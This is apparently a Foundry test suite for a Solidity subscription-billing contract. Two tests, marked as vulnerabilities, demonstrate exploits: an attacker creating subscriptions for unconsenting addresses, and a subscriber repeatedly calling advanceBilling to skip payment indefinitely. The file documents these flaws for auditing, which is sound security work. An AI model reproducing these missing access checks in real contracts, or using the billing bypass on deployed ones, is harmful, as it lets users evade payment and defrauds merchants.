// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/SubscriptionRegistry.sol";

contract SubscriptionRegistryTest is Test {
    SubscriptionRegistry registry;

    address merchant = address(0xBEEF);
    address subscriber = address(0xCAFE);
    address attacker = address(0xBAD);

    bytes32 planId = keccak256("plan-1");

    function setUp() public {
        registry = new SubscriptionRegistry();
    }

    function _createBasicPlan() internal {
        vm.prank(merchant);
        registry.createPlan(planId, 5_000_000, SubscriptionRegistry.Interval.Monthly, 0, 0);
    }

    // ---------- createPlan ----------

    function test_createPlan_success() public {
        _createBasicPlan();
        SubscriptionRegistry.Plan memory plan = registry.getPlan(planId);
        assertEq(plan.merchant, merchant);
        assertEq(plan.price, 5_000_000);
        assertTrue(plan.active);
        assertEq(registry.totalPlans(), 1);
    }

    function test_createPlan_revertsOnZeroId() public {
        vm.prank(merchant);
        vm.expectRevert(SubscriptionRegistry.ZeroPlanId.selector);
        registry.createPlan(bytes32(0), 5_000_000, SubscriptionRegistry.Interval.Monthly, 0, 0);
    }

    function test_createPlan_revertsOnZeroPrice() public {
        vm.prank(merchant);
        vm.expectRevert(SubscriptionRegistry.InvalidPrice.selector);
        registry.createPlan(planId, 0, SubscriptionRegistry.Interval.Monthly, 0, 0);
    }

    function test_createPlan_revertsOnDuplicate() public {
        _createBasicPlan();
        vm.prank(merchant);
        vm.expectRevert(abi.encodeWithSelector(SubscriptionRegistry.PlanAlreadyExists.selector, planId));
        registry.createPlan(planId, 5_000_000, SubscriptionRegistry.Interval.Monthly, 0, 0);
    }

    function test_createPlan_revertsOnInvalidCustomInterval() public {
        vm.prank(merchant);
        vm.expectRevert(SubscriptionRegistry.InvalidCustomInterval.selector);
        registry.createPlan(planId, 5_000_000, SubscriptionRegistry.Interval.Custom, 0, 0);
    }

    // ---------- pause / resume plan ----------

    function test_pausePlan_onlyMerchant() public {
        _createBasicPlan();

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(SubscriptionRegistry.NotPlanMerchant.selector, planId, attacker));
        registry.pausePlan(planId);

        vm.prank(merchant);
        registry.pausePlan(planId);
        assertFalse(registry.getPlan(planId).active);
    }

    // ---------- createSubscription ----------

    function test_createSubscription_success() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);

        bytes32 subId = registry.subscriptionId(planId, subscriber);
        SubscriptionRegistry.Subscription memory sub = registry.getSubscription(subId);
        assertEq(sub.subscriber, subscriber);
        assertTrue(sub.active);
        assertEq(registry.totalSubscriptions(), 1);
    }

    function test_createSubscription_revertsOnInactivePlan() public {
        _createBasicPlan();
        vm.prank(merchant);
        registry.pausePlan(planId);

        vm.expectRevert(abi.encodeWithSelector(SubscriptionRegistry.PlanNotActive.selector, planId));
        registry.createSubscription(planId, subscriber);
    }

    function test_createSubscription_revertsOnDuplicate() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);

        vm.expectRevert(abi.encodeWithSelector(SubscriptionRegistry.AlreadySubscribed.selector, planId, subscriber));
        registry.createSubscription(planId, subscriber);
    }

    /// @notice VULNERABILITY (medium): createSubscription has no access
    /// control. Anyone can create a subscription record for an arbitrary
    /// address, with no consent and no payment ever taking place.
    function test_VULN_anyoneCanCreateSubscriptionForVictim() public {
        _createBasicPlan();
        address victim = makeAddr("victim");

        vm.prank(attacker);
        registry.createSubscription(planId, victim);

        bytes32 subId = registry.subscriptionId(planId, victim);
        SubscriptionRegistry.Subscription memory sub = registry.getSubscription(subId);

        assertTrue(sub.active);
        assertEq(sub.subscriber, victim);
    }

    // ---------- cancel subscription ----------

    function test_cancelSubscription_onlySubscriber() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);
        bytes32 subId = registry.subscriptionId(planId, subscriber);

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(SubscriptionRegistry.NotSubscriber.selector, subId, attacker));
        registry.cancelSubscription(subId);

        vm.prank(subscriber);
        registry.cancelSubscription(subId);
        assertFalse(registry.getSubscription(subId).active);
    }

    // ---------- advanceBilling: the critical one ----------

    /// @notice VULNERABILITY (critical): advanceBilling has no access
    /// control and no check that billing is actually due. The subscriber
    /// can call it directly on the registry the moment each cycle becomes
    /// due, resetting nextBillingAt for free — bypassing PullPayment and
    /// every USDC pull entirely. Repeated once per cycle, this is
    /// indefinite free service.
    function test_VULN_subscriberCanSkipBillingForever() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);
        bytes32 subId = registry.subscriptionId(planId, subscriber);

        for (uint256 i = 0; i < 6; i++) {
            vm.warp(block.timestamp + 30 days);
            assertTrue(registry.isBillingDue(subId));

            vm.prank(subscriber);
            registry.advanceBilling(subId);

            assertFalse(registry.isBillingDue(subId));
        }

        assertEq(registry.getSubscription(subId).billingCount, 6);
    }

    // ---------- upgradeSubscription ----------

    function test_upgradeSubscription_success() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);
        bytes32 oldSubId = registry.subscriptionId(planId, subscriber);

        bytes32 newPlanId = keccak256("plan-2");
        vm.prank(merchant);
        registry.createPlan(newPlanId, 10_000_000, SubscriptionRegistry.Interval.Monthly, 0, 0);

        vm.prank(subscriber);
        bytes32 newSubId = registry.upgradeSubscription(oldSubId, newPlanId);

        assertFalse(registry.getSubscription(oldSubId).active);
        assertTrue(registry.getSubscription(newSubId).active);
    }

    // ---------- isBillingDue ----------

    function test_isBillingDue_falseBeforeInterval() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);
        bytes32 subId = registry.subscriptionId(planId, subscriber);
        assertFalse(registry.isBillingDue(subId));
    }

    function test_isBillingDue_trueAfterInterval() public {
        _createBasicPlan();
        registry.createSubscription(planId, subscriber);
        bytes32 subId = registry.subscriptionId(planId, subscriber);
        vm.warp(block.timestamp + 31 days);
        assertTrue(registry.isBillingDue(subId));
    }
}
